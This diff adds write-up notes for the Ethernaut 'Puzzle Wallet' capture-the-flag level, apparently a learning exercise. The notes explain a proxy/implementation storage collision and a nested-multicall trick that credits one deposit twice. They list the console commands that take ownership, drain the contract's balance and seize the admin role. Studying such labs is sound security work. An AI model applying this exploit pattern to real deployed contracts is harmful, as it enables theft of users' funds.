@@ -1,0 +1,200 @@
+------------------
+NOTES
+------------------
+
+LEVEL 24: Puzzle Wallet
+
+Vulnerability - Insecure storage slots with delegatecalls, insufficient input
+checking/ sanitation within multicall
+
+- The goal of this level is to get become the admin of the PuzzleProxy
+	contract
+- There are storage collisions within the two contracts, PuzzleProxy and
+	PuzzleWallet
+	- The collisions map pendingAdmin and owner, as well as admin and maxBalance
+		between the two contracts
+
+						 | 	PuzzleProxy 			| 	PuzzleWallet
+			-------+--------------------+--------------
+			Slot 0 | 	pendingAdmin 			|		owner
+			Slot 1 |	admin 						|		maxBalance
+
+		- This means being able to overwriting one of these variables will
+			overwrite its partner in the same slot
+
+- This means we can change the maxBalance variable to overwrite the admin
+	variable
+	- This is a bit of a complicated process since there are various access
+		controls in place to prevent anyone from messing around
+	- But the general process looks like this:
+		- Overwrite pendingAdmin to become the owner and approve new people to the
+			whitelist
+		- Use the whitelist protected delegatecalls to drain the current balance
+		- Overwrite the now drained balance with our own address
+
+- General overview of each step
+	- Getting whitelisted
+		- We need to get whitelisted so we can access the dangerous multicall()
+			function
+		- Only the owner of the PuzzleWallet contract can approve new address to
+			the whitelist
+		- However we have a work around! There is a storage collision between
+			pendingAdmin (PuzzleProxy
+			contract) and owner (PuzzleWallet)
+			- To change pendingAdmin, there is a public function available, so we
+				just need to call that!
+		- Once we are the owner of PuzzleWallet we can add ourselves to the
+			whitelist
+
+	- Exploiting the multicall() function
+		- We aren't able to just go and change the maxBalance because
+			setMaxBalance() has the following line:
+
+			require(address(this).balance == 0, "Contract balance is not 0");
+
+			- Requires the contract balance is 0
+
+		- AND we can't withdraw everything from the contract because execute() has
+			this line:
+
+			require(balances[msg.sender] >= value, "Insufficient balance");
+
+			- Requires the balance of the specific address is greater than or equal
+				to the amount they want to withdraw
+
+		- So we need to increase our balance to be >= to the balance of the
+			contract
+			- How can we do that?
+			- If we are able to call deposit() multiple times with the same
+				msg.value, what if we used multicall to call deposit() twice, but with
+				one msg.value?
+				- If we call:
+
+					multicall([<deposit calldata>, <deposit calldata>], {value:toWei('.001')})
+
+					- The multicall function will execute deposit() twice, updating the
+						players balance twice, and only update the contract's
+						value with the amount sent in the multicall
+					- This means the player's balance will be updated from 0 -> .002,
+						and the balance of the contract will be updated from .001 -> .002
+			- Now we can withdraw the balance of the contract so we can overwrite
+				the maxBalance variable!
+
+		- BUT we can't call deposit() multiple times from the multicall because of
+			this section:
+
+			if (selector == this.deposit.selector) {
+      		require(!depositCalled, "Deposit can only be called once");
+        	// Protect against reusing msg.value
+          depositCalled = true;
+      }
+
+			- Requires that deposit() has only been called once per multicall
+
+		- Hmmmm, we have been really locked up here...
+			- but what if instead of calling deposit from within multicall, we
+				called multicall() from within multicall?
+				- multicall() inception 0o0
+			- If we have a master multicall() that will then call two separate
+				multicall()'s which themself call deposit(), we will ultimately have
+				two deposit() calls from a single transaction, and be able to update
+				our balance as highlighted above
+			- This is a bit confusing but refer to the following tree for the layout
+				of the transaction:
+
+												Multicall that calls 2 more multicalls
+																					|
+																					|
+																					|
+					multicall that calls deposit()--+--multicall that calls deposit
+													| 																 |
+													| 																 |
+											deposit() 												 deposit()
+
+	- Oof that was a bit of some trouble, however, with some magic we are able
+		to update our balance so we can withdraw all the money and update the
+		maxBalance as our address and finally become the admin!
+
+Exploitation
+- Overwriting the owner variable
+	- To overwrite the owner variable, we need to call proposeNewAdmin() of
+		PuzzleProxy
+	- We face a small hurdle in the JS console in the browser, that we are not
+		given the address of PuzzleProxy right away
+		- We have couple different solutions, we can reverse the address, get the
+			address from etherscan.io or encode the call to proposeNewAdmin()
+			ourself
+		- I will be going over encoding proposeNewAdmin() ourselves
+		- Lucking, web3.js has a pre-built function  to encode the function call
+			- We need to pass in the ABI of the function and the parameters needed
+
+				// From the web3.js docs:
+				web3.eth.abi.encodeFunctionCall(jsonInterface, parameters);
+				// https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html#encodefunctioncall
+
+			- Here is the function signature (fs)
+
+				fs = {
+					name: 'proposeNewAdmin',
+					type:'function',
+					inputs: [
+								{
+									type: 'address',
+									name:'_newAdmin'
+								}
+							]
+						}
+
+				- And we need to encode our address (player) as the parameter
+
+					data = web3.eth.abi.encodeFunctionCall(fs, [player])
+
+				- Finally lets make ourselves the owner :)
+
+					await web3.eth.sendTransaction({from: player, to: instance, data})
+
+- Adding ourselves to the whitelist
+	- Now as the owner, adding our address to the whitelist is very straight
+		forward, just call addToWhitelist() with your address as the parameter
+
+			await contract.addToWhitelist(player)
+
+- Multicall magic
+	- Here's where the magic *really* happens
+	- Luckily we got the confusing theory bits out of the way earlier and the
+		actual exploitation is fairly simple to follow
+		- multicall() takes in the calldata (special data location that contains
+			the function arguments, only available for external function call
+			parameters, from:
+			https://ethereum.stackexchange.com/questions/63247/calldata-keyword-as-parameter-in-solidity-v0-5-0-function)
+			as a parameter
+		- Lets create a variable to act as the calldata for deposit()
+
+			depData = await contract.methods["deposit()"].request().then(i => i.data)
+
+		- Cool, now lets create a variable calldata for multicall() calling
+			deposit()
+
+			multiData = await contract.methods["multicall(bytes[])"].request([depdata]).then(i => i.data)
+
+		- Now lets create the master multicall that will create two multicalls
+			which in turn call deposit
+
+			await contract.multicall([multiData, multiData], {value: toWei('0.001')})
+
+			- Note, we add the value of .001 eth (or the current value of the
+				contract)
+
+- Draining the contract
+	- Now that we have updated our balance to be == to the balance of the
+		contract, we can steal the whole thing!
+
+		await contract.execute(player, getBalance(contract), 0x0)
+
+- Overwriting admin
+	- Finally, the contract has a balance of 0 and we can overwrite maxBalance
+		with one final call
+
+		await contract.setMaxBalance(player)
+
+- Submit the instance :)
